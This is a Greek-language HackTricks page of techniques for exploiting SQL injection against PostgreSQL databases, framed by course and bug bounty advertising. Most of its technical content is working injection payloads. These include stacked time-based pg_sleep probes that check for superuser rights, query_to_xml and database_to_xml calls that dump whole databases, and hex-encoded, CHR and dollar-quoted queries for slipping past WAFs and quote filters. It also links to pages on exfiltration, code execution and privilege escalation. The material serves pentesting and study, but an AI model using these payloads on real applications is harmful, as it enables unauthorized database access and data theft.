# Εισαγωγή SQL στο PostgreSQL

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Συμβουλή για bug bounty**: **Εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty που δημιουργήθηκε από χάκερς, για χάκερς**! Γίνετε μέλος μας στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

***

**Αυτή η σελίδα έχει σκοπό να εξηγήσει διάφορα κόλπα που μπορούν να σας βοηθήσουν να εκμεταλλευτείτε μια εισαγωγή SQL που βρέθηκε σε μια βάση δεδομένων postgresql και να συμπληρώσει τα κόλπα που μπορείτε να βρείτε στο** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

## Αλληλεπίδραση Δικτύου - Ανέλιξη Προνομίων, Σαρωτής Θυρών, Αποκάλυψη Απόκρισης Πρόκλησης NTLM & Εξαγωγή

Το **module PostgreSQL `dblink`** προσφέρει δυνατότητες για σύνδεση με άλλες περιπτώσεις PostgreSQL και εκτέλεση συνδέσεων TCP. Αυτές οι δυνατότητες, σε συνδυασμό με τη λειτουργία `COPY FROM`, επιτρέπουν ενέργειες όπως η άνοδος προνομίων, ο σαρωτής θυρών και η καταγραφή της απόκρισης πρόκλησης NTLM. Για λεπτομερείς μεθόδους εκτέλεσης αυτών των επιθέσεων, ελέγξτε πώς να [εκτελέσετε αυτές τις επιθέσεις](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md).

### **Παράδειγμα εξαγωγής χρησιμοποιώντας dblink και μεγάλα αντικείμενα**

Μπορείτε να [**διαβάσετε αυτό το παράδειγμα**](dblink-lo\_import-data-exfiltration.md) για να δείτε ένα παράδειγμα CTF **πώς να φορτώσετε δεδομένα μέσα σε μεγάλα αντικείμενα και στη συνέχεια να εξαγάγετε το περιεχόμενο των μεγάλων αντικειμένων μέσα στο όνομα χρήστη** της συνάρτησης `dblink_connect`.

## Επιθέσεις PostgreSQL: Ανάγνωση/εγγραφή, RCE, άνοδος προνομίων

Ελέγξτε πώς να διακινδυνεύσετε τον υπολογιστή και να αναβαθμίσετε τα προνόμια από το PostgreSQL στο:

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## Παράκαμψη WAF

### Συναρτήσεις συμβολοσειρών PostgreSQL

Η διαχείριση συμβολοσειρών μπορεί να σας βοηθήσει να **παρακάμψετε WAFs ή άλλους περιορισμούς**.\
[**Σε αυτήν τη σελίδα** ](https://www.postgresqltutorial.com/postgresql-string-functions/)**μπορείτε να βρείτε μερικές χρήσιμες συναρτήσεις συμβολοσειρών.**

### Στοίβα Ερωτημάτων

Θυμηθείτε ότι το postgresql υποστηρίζει στοίβα ερωτημάτων, αλλά πολλές εφαρμογές θα εμφανίσουν σφάλμα αν επιστραφούν 2 απαντήσεις όταν αναμένεται μόνο 1. Ωστόσο, μπορείτε ακόμα να καταχραστείτε τις στοίβες ερωτημάτων μέσω ενέσεων Χρόνου:
```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```
### Κόλπα με XML

**query\_to\_xml**

Αυτή η συνάρτηση θα επιστρέψει όλα τα δεδομένα σε μορφή XML σε ένα μόνο αρχείο. Είναι ιδανική αν θέλετε να αποθηκεύσετε πολλά δεδομένα σε μία μόνο γραμμή:
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```
**database\_to\_xml**

Αυτή η συνάρτηση θα αδειάσει ολόκληρη τη βάση δεδομένων σε μορφή XML σε μόλις 1 γραμμή (να είστε προσεκτικοί αν η βάση δεδομένων είναι πολύ μεγάλη, καθώς μπορεί να προκαλέσετε DoS ή ακόμη και στον ίδιο σας τον πελάτη):
```sql
SELECT database_to_xml(true,true,'');
```
### Συμβολοσειρές σε Hex

Εάν μπορείτε να εκτελέσετε **ερωτήματα** περνώντας τα **μέσα από μια συμβολοσειρά** (για παράδειγμα χρησιμοποιώντας τη συνάρτηση **`query_to_xml`**). **Μπορείτε να χρησιμοποιήσετε την `convert_from` για να περάσετε τη συμβολοσειρά ως hex και να παρακάμψετε τα φίλτρα με αυτόν τον τρόπο:**

{% code overflow="wrap" %}
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
{% endcode %}

### Απαγορευμένα εισαγωγικά

Αν δεν μπορείτε να χρησιμοποιήσετε εισαγωγικά για το payload σας, μπορείτε να παρακάμψετε αυτό με τη χρήση της `CHR` για βασικές δηλώσεις (_η συνένωση χαρακτήρων λειτουργεί μόνο για βασικά ερωτήματα SQL όπως SELECT, INSERT, DELETE κ.λπ. Δεν λειτουργεί για όλες τις δηλώσεις SQL_):
```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```
Ή με `$`. Αυτές οι ερωτήσεις επιστρέφουν τα ίδια αποτελέσματα:
```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```
<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Συμβουλή για bug bounty**: **Εγγραφείτε** στο **Intigriti**, μια προηγμένη πλατφόρμα bug bounty που δημιουργήθηκε από χάκερς, για χάκερς! Γίνετε μέλος σήμερα στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΠΛΑΝΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Γίνετε μέλος** 💬 [**ομάδας Discord**](https://discord.gg/hRep4RUj7f) ή της [**ομάδας telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
